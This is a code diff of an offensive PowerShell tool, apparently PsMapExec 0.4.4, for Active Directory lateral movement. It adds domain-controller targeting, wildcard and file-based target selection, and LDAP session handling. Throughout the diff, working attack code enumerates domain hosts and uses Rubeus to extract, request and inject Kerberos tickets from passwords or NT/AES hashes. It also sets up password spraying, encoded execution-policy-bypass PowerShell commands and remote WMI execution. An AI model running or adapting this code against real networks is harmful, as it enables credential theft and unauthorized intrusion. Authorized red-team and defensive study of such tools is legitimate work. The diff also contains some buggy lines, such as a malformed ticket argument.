@@ -34,7 +34,7 @@ Param(
     [String]$LocalFileServer = "",
 
     [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
-    [String]$Threads = "8",
+    [int]$Threads = 30,
 
     [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
     [switch]$Force,
@@ -70,7 +70,16 @@ Param(
     [String]$SprayHash = "",
 
     [Parameter(Mandatory=$False, Position=22, ValueFromPipeline=$true)]
-    [String]$SprayPassword = ""
+    [String]$SprayPassword = "",
+
+    [Parameter(Mandatory=$False, Position=23, ValueFromPipeline=$true)]
+    [switch]$NoBanner,
+
+    [Parameter(Mandatory=$False, Position=24, ValueFromPipeline=$true)]
+    [string]$DomainController,
+
+    [Parameter(Mandatory=$False, Position=24, ValueFromPipeline=$true)]
+    [int]$Timeout = 50
 )
 
 # Check for mandatory parameter
@@ -96,31 +105,77 @@ $Banner = @("
  | |     ____) | |  | |/ ____ \| |    | |____ / . \| |___| |____ 
  |_|    |_____/|_|  |_/_/    \_\_|    |______/_/ \_\______\_____|
                                                                  
-")
 
+Github  : https://github.com/The-Viper-One
+Version : 0.4.4")
+
+if (!$NoBanner){
 Write-Output $Banner
-Write-Host "Github  : "  -NoNewline
-Write-Host "https://github.com/The-Viper-One"
-Write-Host "Version : " -NoNewline
-Write-Host "0.4.3"
-Write-Host
+}
+
+function Test-DomainJoinStatus {
+    if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain) {
+        return $true
+    } else {
+        return $false
+    }
+}
+
+$DomainJoined = Test-DomainJoinStatus
+
+if ($DomainJoined) {
+    if ($NoBanner){Write-Output ""}
+    Write-Output "Domain  : Yes"
+} elseif (!$DomainJoined) {
+    if ($NoBanner){Write-Output ""}
+    Write-Output "Domain  : No"
+}
 
 # If no targets have been provided
 if (-not $Targets -and $Method -ne "Spray") {
-    Write-host "[-]  " -ForegroundColor "Red" -NoNewline
+    Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
     Write-host "You must provide a value for -targets (all, servers, DCs, Workstations)"
     return
 }
 
+if ($Targets -match "^\*+$") {
+    Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "The target cannot consist only of asterisks. Please specify a more specific target."
+    return
+}
 
+if ($Targets -match "^\*.*|.*\*$"){Write-Host "Targets : Wildcard matching"}
+elseif ($Targets -eq "Workstations"){Write-Host "Targets : Workstations"}
+elseif ($Targets -eq "Servers"){Write-Host "Targets : Servers"}
+elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers"){Write-Host "Targets : Domain Controllers"}
+elseif ($Targets -eq "All" -or $Targets -eq "Everything"){Write-Host "Targets : All"}
+elseif ($Targets -notmatch "\*"){$IsFile = Test-Path $Targets ; if ($IsFile){Write-Host "Targets : File ($Targets)"}}
+
+function IsIPAddressOrCIDR {
+    param ([string]$Target)
+
+    # Regular expressions for IP address and CIDR notation
+    $ipPattern = '^\d{1,3}(\.\d{1,3}){3}$'
+    $cidrPattern = '^\d{1,3}(\.\d{1,3}){3}\/\d{1,2}$'
+
+    # Check if the target matches either the IP address or CIDR pattern
+    return $Target -match $ipPattern -or $Target -match $cidrPattern
+}
+
+
+# Check if Targets is a valid IP or CIDR
+if (IsIPAddressOrCIDR $Targets) {
+    Write-Host
+    Write-Error "IP Address not yet supported"
+    continue
+} else {$IPAddress = $False}
 
 ################################################################################################################
 ####################################### Some logic based checking ##############################################
 ################################################################################################################
-
-
 if ($Method -ne "") {
     switch ($Method) {
+        "All" {}
         "WinRM" {}
         "MSSQL" {}
         "SMB" {}
@@ -172,19 +227,19 @@ if ($Module -eq "NTDS" -and ($Targets -in @("Everything", "Workstations", "all",
 }
 
 
+if ($Threads -lt 1 -or -not [int]::TryParse($Threads, [ref]0)) {
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Threads value should not be less than 1"
+        return
+}
 
-
-
-if ($Threads -lt 2){
-        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Threads value should not be less than 2"
+if ($Threads -gt 100) {
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Threads value should not be than 100. This will likely cause results to be missed."
         return
 }
 
 
-
-$DomainJoined = $True
-try {[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain() | Out-Null } Catch {$DomainJoined = $False}
 
 if (!$DomainJoined){$CurrentUser = $False}
 
@@ -228,9 +283,6 @@ if ($Method -eq "RDP") {
         return
     }
 }
-
-
-
 
 
 if ($Method -eq "VNC") {
@@ -312,6 +364,8 @@ if ($Method -eq "MSSQL" -and !$LocalAuth -and (($Username -eq "" -and $Password 
     return
 }
 
+# Check if this conflicts with anything
+if ($LocalAuth){$CurrentUser = $True}
 
 # Check script modules
 $InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyContinue"
@@ -342,7 +396,56 @@ if (![string]::IsNullOrEmpty($LocalFileServer)) {
     }
 }
 
+################################################################################################################
+######################################### Console Display variables ############################################
+################################################################################################################
 
+function Display-ComputerStatus {
+    param (
+        [string]$ComputerName,
+        [string]$OS,
+        [System.ConsoleColor]$statusColor = 'White',
+        [string]$statusSymbol = "",
+        [string]$statusText = "",
+        [int]$NameLength,
+        [int]$OSLength,
+        [string]$successfulProtocols
+    )
+
+    # Prefix
+    switch ($Method) {
+        "SMB" { Write-Host "SMB" -ForegroundColor "Yellow" -NoNewline }
+        "WMI" { Write-Host "WMI" -ForegroundColor "Yellow" -NoNewline }
+        "WinRM" { Write-Host "WinRM" -ForegroundColor "Yellow" -NoNewline }
+        "All" { Write-Host "ALL" -ForegroundColor "Yellow" -NoNewline }
+        "GenRelayList" { Write-Host "GenRelayList" -ForegroundColor "Yellow" -NoNewline }
+        "SessionHunter" { Write-Host "SessionHunter" -ForegroundColor "Yellow" -NoNewline }
+        "VNC" { Write-Host "VNC" -ForegroundColor "Yellow" -NoNewline }
+    }
+    
+    Write-Host "   " -NoNewline
+
+    # Resolve IP
+    $IP = $null
+    $Ping = New-Object System.Net.NetworkInformation.Ping
+    $Result = $Ping.Send($ComputerName, 15)
+    if ($Result.Status -eq 'Success') {
+        $IP = $Result.Address.IPAddressToString
+        Write-Host ("{0,-16}" -f $IP) -NoNewline
+    } else {
+        Write-Host ("{0,-16}" -f $IP) -NoNewline
+    }
+
+    # Display ComputerName and OS
+    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
+    Write-Host "   " -NoNewline
+    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
+    Write-Host "   " -NoNewline
+
+    # Display status symbol and text
+    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
+    Write-Host $statusText
+}
 
 ################################################################################################################
 ########################################### Initial Directory Setup ############################################
@@ -387,6 +490,7 @@ foreach ($directory in $directories) {
     if (-not (Test-Path $directory)) {
         New-Item -ItemType Directory -Force -Path $directory | Out-Null
         if ($directory -eq $PME) {
+            Write-Host
             Write-Host "[+] " -ForegroundColor "Green" -NoNewline
             Write-Host "Created directory for PME at $directory"
             Write-Host
@@ -459,7 +563,6 @@ if (!$CurrentUser) {
     }
 }
 
-
 ################################################################################################################
 ##################################### Ticket logic for authentication ##########################################
 ################################################################################################################
@@ -475,52 +578,49 @@ if (!$CurrentUser) {
     
     # If the method is not RDP proceed
     if ($Method -ne "RDP") {
-    if ($Method -ne "MSSQL"){
-        
-        # If the system is domain joined, store the current user ticket into a variable to restore later
-        if ($DomainJoined) {
-            try {
+    if ($Method -ne "MSSQL") {
+    # If the system is domain joined, store the current user ticket into a variable to restore later
+    if ($DomainJoined) {
+        try {
+            if ($DomainController -ne "") {
+                Invoke-Rubeus "tgtdeleg /nowrap /domain:$domain /dc:$DomainController" | Out-String
+            } else {
                 $BaseTicket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
-                $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
             }
-            catch {
-                try {
-                    if (!$CheckAdmin) {
-                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
-                        $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+            $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+        } catch {
+            try {
+                if (!$CheckAdmin) {
+                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
+                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
 
-                        if ($OriginalUserTicket -notlike "doI*") {
-                            Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
-                            Write-Host "Unable to retrieve any Kerberos tickets"
-                            Write-Host "1"
-                            return
-                        }
+                    if ($OriginalUserTicket -notlike "doI*") {
+                        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+                        Write-Host "Unable to retrieve any Kerberos tickets"
+                        return
                     }
-                    elseif ($CheckAdmin) {
-                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /username:$env:username /nowrap" | Out-String
-                        $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+                } elseif ($CheckAdmin) {
+                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /username:$env:username /nowrap" | Out-String
+                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
 
-                        if ($OriginalUserTicket -notlike "doI*") {
-                            Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
-                            Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
-                            Write-Host "2"
-                            return
-                        }
+                    if ($OriginalUserTicket -notlike "doI*") {
+                        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+                        Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
+                        return
                     }
                 }
-                catch {
-                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                    Write-Host "Unable to retrieve any Kerberos tickets"
-                    Write-Host "3"
-                    return
-                }
+            } catch {
+                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                Write-Host "Unable to retrieve any Kerberos tickets"
+                return
             }
         }
     }
+}
 
     
-    if ($Method -ne "RDP"){
-    # Check if ticket has been provided
+    if ($Method -ne "RDP") {
+    # Check if a ticket has been provided
     if ($Ticket -ne "") {
         if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
             $Ticket = Get-Content -Path $Ticket -Raw
@@ -535,7 +635,7 @@ if (!$CurrentUser) {
             return
         }
 
-        # Use regular expression to extract the Username
+        # Use regular expressions to extract ticket information
         $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
         $TicketRealm = [regex]::Match($ProvidedTicket, "UserRealm\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
         $TicketExpiry = [regex]::Match($ProvidedTicket, "EndTime\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
@@ -555,29 +655,51 @@ if (!$CurrentUser) {
         Write-Host
 
         # Attempt to inject the ticket into the current session
-        $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket"
+        if ($DomainController -ne "") {
+            $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket /domain:$Domain /dc:$DomainController"
+        } else {
+            $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket /domain:$Domain"
+        }
+
         if ($InjectTicket -like "*Error 1398*") {
             Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-host "Ticket expired"
+            Write-Host "Ticket expired"
             klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+
+            if ($DomainController -ne "") {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController " | Out-Null
+            } else {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+            }
             return
         }
-    }
-    elseif ($Password -ne "") {
+    } elseif ($Password -ne "") {
         klist purge | Out-Null
 
         if ($UserDomain -ne "") {
-            $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"
+            if ($DomainController -ne "") {
+                $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /dc:$DomainController /opsec /force /ptt"
+            } else {
+                $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"
+            }
         } elseif ($UserDomain -eq "") {
-            $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"
+            if ($DomainController -ne "") {
+                $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /dc:$DomainController /opsec /force /ptt"
+                Write-host $AskPassword
+            } else {
+                $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"
+            }
         }
 
         if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*") {
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
             Write-Host "Incorrect password or username"
             klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+            if ($DomainController -ne "") {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController " | Out-Null
+            } else {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+            }
             return
         }
 
@@ -585,26 +707,41 @@ if (!$CurrentUser) {
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
             Write-Host "Incorrect password or username"
             klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+            if ($DomainController -ne "") {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController " | Out-Null
+            } else {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+            }
             return
         }
-    }
-    elseif ($Hash -ne "") {
+    } elseif ($Hash -ne "") {
         if ($Hash.Length -eq 32) {
             klist purge | Out-Null
 
             if ($UserDomain -ne "") {
-                $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"
+                if ($DomainController -ne "") {
+                    $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /dc:$DomainController /rc4:$Hash /opsec /force /ptt"
+                } else {
+                    $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"
+                }
             }
             if ($UserDomain -eq "") {
-                $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"
+                if ($DomainController -ne "") {
+                    $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /dc:$DomainController /rc4:$Hash /opsec /force /ptt"
+                } else {
+                    $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"
+                }
             }
 
             if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Incorrect hash or username"
                 klist purge | Out-Null
-                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                if ($DomainController -ne "") {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController" | Out-Null
+                } else {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+                }
                 return
             }
 
@@ -612,25 +749,40 @@ if (!$CurrentUser) {
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Incorrect hash or username"
                 klist purge | Out-Null
-                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                if ($DomainController -ne "") {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController" | Out-Null
+                } else {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+                }
                 return
             }
-        }
-        elseif ($Hash.Length -eq 64) {
+        } elseif ($Hash.Length -eq 64) {
             klist purge | Out-Null
 
             if ($UserDomain -ne "") {
-                $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UseDomain /aes256:$Hash /opsec /force /ptt"
+                if ($DomainController -ne "") {
+                    $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /dc:$DomainController /aes256:$Hash /opsec /force /ptt"
+                } else {
+                    $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /aes256:$Hash /opsec /force /ptt"
+                }
             }
             if ($UserDomain -eq "") {
-                $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"
+                if ($DomainController -ne "") {
+                    $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /dc:$DomainController /aes256:$Hash /opsec /force /ptt"
+                } else {
+                    $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"
+                }
             }
 
             if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Incorrect hash or username"
                 klist purge | Out-Null
-                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                if ($DomainController -ne "") {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController" | Out-Null
+                } else {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+                }
                 return
             }
 
@@ -638,20 +790,23 @@ if (!$CurrentUser) {
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Incorrect hash or username"
                 klist purge | Out-Null
-                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                if ($DomainController -ne "") {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /$Domain /dc:$DomainController" | Out-Null
+                } else {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+                }
                 return
             }
-        }
-        else {
+        } else {
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
             Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
             Write-Host 
             Write-Host
             return
-            
-                }
-            }
         }
+    }
+}
+
     }
 }
 
@@ -660,25 +815,52 @@ if (!$CurrentUser) {
 ########################################## Domain Target Acquisition ###########################################
 ################################################################################################################
 
-Function Bind {
-param ($Domain)
-    $DirectoryEntry = [ADSI]"LDAP://$domain"
+function Establish-LDAPSession {
+    param (
+        [Parameter(Mandatory=$true)]
+        [string]$Domain,
 
-if ($DirectoryEntry.distinguishedName) {} else {
-    
-    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "Failed to bind to the domain"
+        [string]$DomainController  # Optional parameter for domain controller
+    )
 
-    if (!$DomainJoined){
-    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "Ensure the credentials parameters provided are for a valid account"
+    if ($DomainController -and -not $DomainController.Contains(".")) {
+        $DomainController = "$DomainController.$Domain"
     }
-    continue
-    
+
+    # Define LDAP parameters
+    $ldapServer = if ($DomainController) { $DomainController } else { $Domain }
+    $ldapPort = 389 # Use 636 for LDAPS (SSL)
+
+    # Load necessary assembly
+    Add-Type -AssemblyName "System.DirectoryServices.Protocols"
+
+    try {
+        # Create LDAP directory identifier
+        $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ldapServer, $ldapPort)
+
+        # Establish LDAP connection as current user
+        $ldapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)
+
+        # Use Negotiate (Kerberos or NTLM) for authentication
+        $ldapConnection.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
+
+        # Bind (establish connection)
+        $ldapConnection.Bind()  # Bind as the current user
+
+    }
+    catch {
+        Write-Error "Failed to establish LDAP connection to '$ldapServer'. Error: $_"
+        RestoreTicket
+        continue
     }
 }
 
-Bind -Domain $Domain
+if ($DomainController -ne "") {
+    Establish-LDAPSession -Domain $Domain -DomainController $DomainController
+} else {
+    Establish-LDAPSession -Domain $Domain
+}
+
 
 
 function New-Searcher {
@@ -688,69 +870,102 @@ function New-Searcher {
     return $searcher
 }
 
-if ($Method -ne "Spray"){
-$searcher = New-Searcher
-$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
+    if ($Method -ne "Spray") {
+        if (!$IPAddress) {
+        $searcher = New-Searcher
+        $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
 
-if ($Targets -eq "Workstations") {
-
-$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
-
-}
-elseif ($Targets -eq "Servers") {
-
-$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
-
-}
-elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
-
-$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll()
-
-}
-elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
-
-
-$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
-
-}
-
-
-elseif ($Method -ne "Spray") {
-    if ($Module -eq "NTDS") {
-        if ($Targets -is [string]) {
-            if ($Targets -notlike "*.*") {
-                $Targets = $Targets + "." + $Domain
+        if ($Targets -match "^\*.*|.*\*$") {
+            $wildcardFilter = $Targets -replace "\*", "*"
+            $searcher.Filter = "(&(objectCategory=computer)(dnshostname=$wildcardFilter))"
+            $computers = $searcher.FindAll() | Where-Object {
+                $_.Properties["operatingSystem"][0] -ne "MacOS" -and
+                $_.Properties["operatingSystem"][0] -ne "MacOS X" -and
+                $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
             }
+        }
+        elseif ($Targets -eq "Workstations") {
+            $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+            $computers = $searcher.FindAll() | Where-Object {
+                $_.Properties["operatingSystem"][0] -ne "MacOS" -and
+                $_.Properties["operatingSystem"][0] -ne "MacOS X" -and
+                $_.Properties["operatingSystem"][0] -notlike "*windows*server*" -and
+                $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+            }
+        }
+        elseif ($Targets -eq "Servers") {
+            $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+            $computers = $searcher.FindAll() | Where-Object {
+                $_.Properties["operatingSystem"][0] -ne "MacOS" -and
+                $_.Properties["operatingSystem"][0] -ne "MacOS X" -and
+                $_.Properties["operatingSystem"][0] -like "*server*" -and
+                $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+            }
+        }
+        elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
+            $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+            $computers = $searcher.FindAll()
+        }
+        elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
+            $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+            $computers = $searcher.FindAll() | Where-Object {
+                $_.Properties["operatingSystem"][0] -ne "MacOS" -and
+                $_.Properties["operatingSystem"][0] -ne "MacOS X" -and
+                $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+            }
+        }
+        elseif ($Targets -notmatch "\*") {
+            if ($IsFile) {
+                $fileContent = Get-Content -Path $Targets
+                $computers = @()
 
-            $searcher = [System.DirectoryServices.DirectorySearcher]::new()
-            $searcher.Filter = "(&(objectCategory=computer)(dnshostname=$Targets)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-            $result = $searcher.FindOne()
+                foreach ($line in $fileContent) {
+                    # Split the line by comma and trim any spaces
+                    $names = $line -split ',' | ForEach-Object { $_.Trim() }
 
-            if ($null -eq $result) {
-                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-                Write-Host "The provided target is not a domain controller"
-                break
+                    foreach ($name in $names) {
+                        if ([string]::IsNullOrWhiteSpace($name)) {
+                            continue
+                        }
+
+                        if ($name -notlike "*.*") {
+                            $name += ".$domain"
+                        }
+
+                        $searcher.Filter = "(dnshostname=$name)"
+                        $result = $searcher.FindOne()
+
+                        if ($result -ne $null) {
+                            $computers += $result.GetDirectoryEntry()
+                        } else {
+                            Write-Warning "No LDAP entry found for $name"
+                        }
+                    }
+                }
+            } else {
+                Write-Host "Targets : $Targets"
+                if ($Targets -notlike "*.*") {
+                    $Targets += ".$domain"
+                }
+                $searcher.Filter = "(dnshostname=$Targets)"
+                $result = $searcher.FindOne()
+
+                if ($result -ne $null) {
+                    $computers = @($result.GetDirectoryEntry())
+                } else {
+                    Write-Host
+                    Write-Warning "No LDAP entry found for the computer: $Targets"
+                    $computers = @()
+                    RestoreTicket
+                    continue
+                    
+                }
             }
         }
     }
-
-    $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
-    if ($ipAddress) {
-        Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
-        break
-    }
-
-    $searcher = [System.DirectoryServices.DirectorySearcher]::new()
-    $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
 }
 
-}
-
-
+Write-Output ""
 
 ################################################################################################################
 ############################ Grab interesting users for various parsing functions ##############################
@@ -791,10 +1006,6 @@ function Get-GroupMembers {
 
     return $members
 }
-
-
-
-
 
 $DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
 $EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
@@ -904,9 +1115,6 @@ if (!$CurrentUser) {
         }
     }
 }
-
-
-
 
 ################################################################################################################
 ################################## Information based on selected module ########################################
@@ -1200,9 +1408,14 @@ $Command = "powershell.exe -ep bypass -enc $base64Command"
 ################################# Logic to help keep output tidy and even ######################################
 ################################################################################################################
 
-if ($Method -ne "Spray"){
+if ($Method -ne "Spray" -and !$IPAddress){
 $NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
 $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
+}
+
+elseif ($Method -ne "Spray" -and $IPAddress){
+$NameLength = 16
+$OSLength = 14
 }
 
 ################################################################################################################
@@ -1211,18 +1424,17 @@ $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].L
 Function Method-WMIexec {
 param ($ComputerName)
 Write-host
-
 $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
 $runspacePool.Open()
 $runspaces = New-Object System.Collections.ArrayList
 
 
 $scriptBlock = {
-    param ($computerName, $Command, $Username, $Password, $LocalAuth)
+    param ($computerName, $Command, $Username, $Password, $LocalAuth, $Timeout)
     
 $tcpClient = New-Object System.Net.Sockets.TcpClient
 $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
-$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 
+$wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 
 
 if ($wait) { 
     try {
@@ -1239,200 +1451,113 @@ $tcpClient.Close()
 if (!$connected) {return "Unable to connect"}
 
 
-    
-    Function LocalWMI {
+# Function to perform WMI operations
+Function WMI {
+    param (
+        [string]$ComputerName,
+        [string]$Command = "whoami",
+        [string]$Class = "PMEClass",
+        [switch]$LocalAuth,
+        [string]$Username,
+        [string]$Password
+    )
 
-param (
-    [string]$Command = "",
-    [string]$Username = "",
-    [string]$Password = "",
-    [string]$ComputerName = "",
-    [switch]$LocalAuth = $true,
-    [string]$Class = "PMEClass"
-)
+    $WMIAccess = $null
 
